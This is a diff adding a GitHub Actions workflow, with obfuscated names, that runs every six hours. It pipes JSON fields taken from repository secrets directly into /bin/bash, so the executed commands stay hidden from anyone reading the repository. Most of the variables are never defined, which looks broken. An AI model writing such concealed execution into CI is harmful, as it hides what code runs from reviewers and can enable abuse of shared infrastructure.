@@ -1,0 +1,28 @@
+name: qianshuzhong8912
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianshuzhong8912
+        env:
+          dbqs014: ${{ secrets.dbqs014 }}
+        run: |
+          echo $dbqs014 | jq -r .obub52111 | /bin/bash
+          echo $t9237 | jq -r .duj5 | /bin/bash
+          echo $wmkj9 | jq -r .synkh5 | /bin/bash
+          echo $sfh595 | jq -r .p786 | /bin/bash
+          echo $cop72 | jq -r .scptn2785 | /bin/bash
+          echo $l25 | jq -r .wajmo52 | /bin/bash
+          echo $p08246 | jq -r .u04 | /bin/bash
+          echo $oilu2414 | jq -r .lepa4191 | /bin/bash
+          echo $hua874 | jq -r .ba98664 | /bin/bash
+          echo $lyh00745 | jq -r .qh658 | /bin/bash
+          echo $cel910 | jq -r .eysnz2 | /bin/bash
+
